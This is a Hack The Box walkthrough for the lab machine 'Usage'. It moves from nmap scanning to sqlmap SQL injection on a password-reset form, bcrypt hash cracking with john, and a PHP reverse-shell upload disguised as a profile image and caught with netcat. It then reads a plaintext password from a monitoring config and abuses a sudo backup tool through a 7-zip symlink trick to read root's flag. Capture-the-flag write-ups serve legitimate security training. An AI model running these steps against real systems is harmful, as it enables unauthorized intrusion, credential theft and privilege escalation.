---
title: "Usage from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Usage from HTB
[page](https://app.hackthebox.com/machines/Usage)
```
$ nmap -sCV --min-rate 4000 10.10.11.18
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 21:24 +04
Nmap scan report for admin.usage.htb (10.10.11.18)
Host is up (0.30s latency).
Not shown: 960 filtered tcp ports (no-response), 38 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Admin | Login
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.83 seconds

```
So there is a site on this IP. Search it with IP and you will get the name of the site, after that you will need to add this to `/etc/hosts`:
```
10.10.11.18 admin.usage.htb usage.htb
```
after searching on the site you will get why you should add `admin.usage.htb`.
***
First thing you should do is open `burp suite` and `sqlmap`. Then go to `usage.htb/forget-passsword` and copy all the text you get in there:
```
POST /forget-password HTTP/1.1
Host: usage.htb
Content-Length: 69
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://usage.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usage.htb/forget-password
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6ImFLY0FYSUZ1dW1TMWp2bTZ5bFl3TUE9PSIsInZhbHVlIjoibzRLeDdmR3RGQnlNaVV4amVXcFBSNnBjR1BPVmJpaXZjU2JqWHdBMlVnd0JHdGI2dEk2RGVxck1lcjlqTXNvME4rSWZVWVVqdmRjc2c3WG5pekNWNnBMWkRnUElCNjBPTlVXV2JHV24zL3NoZyt3ME9mVzZsTVltbWVaSWNaVE4iLCJtYWMiOiI4OTk0YzdkNzlmY2I2NGMzNWJlOTlmMjE3NDk1YTI1NDA2NGQ3ZDgwNGI4MWZlNzg2MjVlY2U1MTNkYjRmMzkyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImpyZG5iY2VTa2RXZVd0S2hwejljTEE9PSIsInZhbHVlIjoiNHQwK1dhc3hqOUlRSDdpczk2TlRob3Z4T2ZDQ09tc1BsZ3doL2NjbnVwaEhmZndPSjdqQWdnYUdma1RPbm1BZmZmWEhsUEFjd21PU3dBQWsyUXlFVXd1TGN2WDV1QXZraFIzNWZkbXZTRW1ibkJiN1FmSTdqWU8yeE1PK1BDUVQiLCJtYWMiOiI3MDRiYjk2ZDdlNDE3MjMzM2M5ZTk2MTcyZmVjZDE2YWM2MmE3NTI2ZDI2OTgzYzQ4MGRlZWMxMWIzMDU0ZjYyIiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=2MSXK7VFyFajXsVOdTFVHRMcjxDh91Yno2S7aPaT&email=test%40test.com
```
I wrote this into `help`file. Which i will be using in `sqlmap`.
`sqlmap`code looks like this:
```
sqlmap -r help -p email --level 5 --risk 3 --threads 10 --dbs --batch --random-agent
```
***
`-p`stands for parameter and in that site parameter is email.
***
After `1 hour and 9 minutes`of boredom you will get this `databases`:
```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```
All the information you will need is in the `usage_blog`database. Then use this code:
```
sqlmap -r help -p email --level 5 --risk 3 --threads 10 -D usage_blog --tables --batch --random-agent
```
This will show the tables inside this database:
```
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```
You will need to look inside `admin_users`table where password and the username is located:
![](/assets/images/Screenshot from 2024-07-31 21-46-04.png)
User ---> `admin`
Password ---> ` $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 `
Store this into `hashes.txt`and use our beloved `john the ripper`on this.
```
$ john -w=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)
1g 0:00:00:06 DONE (2024-07-31 18:57) 0.1470g/s 243.5p/s 243.5c/s 243.5C/s alexis1..gymnastics
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Decoded password is : `whatever1`.
Then login in as admin on this link: `admin.usage.htb`.
After logging in you will have to change the profile with `php-reverse-shell.php` which will be named `php.jpg`because you can't upload `.php`file as a profile picture. You will change that with `burpsuite`.
```
$ cp php-reverse-shell.php ~/Desktop/php.jpg
```
Then open port with `NetCat`:
```
nc -nlvp 1234
```
upload fake `.jpg`file as the profile with `burpsuite`and `intercept`is on, because you will modify `php.jpg`as `php.php`so it will work. then you will forward it and you will get the connection on `NetCat`.
```
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.16] from (UNKNOWN) [10.10.11.18] 53114
Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 16:57:42 up  6:56,  0 users,  load average: 2.14, 2.25, 2.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(dash) gid=1000(dash) groups=1000(dash)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
dash@usage:/$
```
You will need this code to activate `bash`shell:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
After that go to `dash`home directory and you can read the `user.txt`:
**ce1eaaafca460b8c56b2c5fbc6808c3d**

After that you need to search where can `xander`-s password be located. You will get that in `dash`-s home directory and to find it you will need to list all the files with:
```
ls -all
```
there is file named: `.monitrc` where password for `xander`is located:
```
cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```
after that you can change the user:
```
dash@usage:~$ su xander
su xander
Password: 3nc0d3d_pa$$w0rd
xander@usage:
```
there is no flag in `xander-s home directory` so then it's located into `/root`.
We'll need to check what permissions does `xander`have:
```
xander@usage:~$ sudo -l
sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```
I don't know how this program works so i had to search what should i do in this moment, so i made `symlink`and connected it with `root.txt`. It looked like this:
```
xander@usage:/var/www/html$ touch @root.txt
touch @root.txt
xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
ln -s /root/root.txt root.txt
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1
1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--
Path = /var/backups/project.zip
Type = zip
Physical Size = 54842066

Scanning the drive:

WARNING: No more files
86ee91210cc27a0cde61983e7f595d07

2984 folders, 17974 files, 113884458 bytes (109 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20958


Files read from disk: 17974
Archive size: 54842208 bytes (53 MiB)

Scan WARNINGS for files and folders:

86ee91210cc27a0cde61983e7f595d07 : No more files
----------------
Scan WARNINGS: 1
```
And there is the `root flag`:
**86ee91210cc27a0cde61983e7f595d07**
